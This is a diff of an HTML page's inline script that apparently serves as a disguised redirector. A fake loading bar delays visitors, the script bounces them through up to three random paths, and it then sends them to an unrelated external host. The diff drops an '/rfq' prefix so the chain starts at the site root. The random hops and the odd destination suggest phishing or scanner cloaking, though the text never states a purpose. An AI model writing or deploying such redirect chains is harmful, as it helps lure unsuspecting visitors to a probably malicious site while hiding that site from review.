@@ -152,14 +152,13 @@
 
     <script>
       (function () {
-        var basePath = "/rfq";
         var finalUrl = "https://liberalization652.apexdrift.app/448orthodoxy/";
         var loadingDelayMs = 7000;
         var maxRandomRedirects = 3;
         var minRandomPathLength = 10;
-        var storageKey = "rfqRedirectStep";
+        var storageKey = "redirectStep";
         var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
-        var tokenPattern = new RegExp("^" + basePath + "/[A-Za-z0-9]{" + minRandomPathLength + ",}/?$");
+        var tokenPattern = new RegExp("^/[A-Za-z0-9]{" + minRandomPathLength + ",}/?$");
         var currentPath = window.location.pathname.replace(/\/+$/, "");
         var progressBar = document.getElementById("loading-progress");
         var startedAt = Date.now();
@@ -174,11 +173,11 @@
             randomString += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
           }
 
-          return basePath + "/" + randomString;
+          return "/" + randomString;
         }
 
         function isInitialPath() {
-          return currentPath === basePath || currentPath === basePath + "/index.html";
+          return currentPath === "" || currentPath === "/index.html";
         }
 
         function redirectToNextStep() {
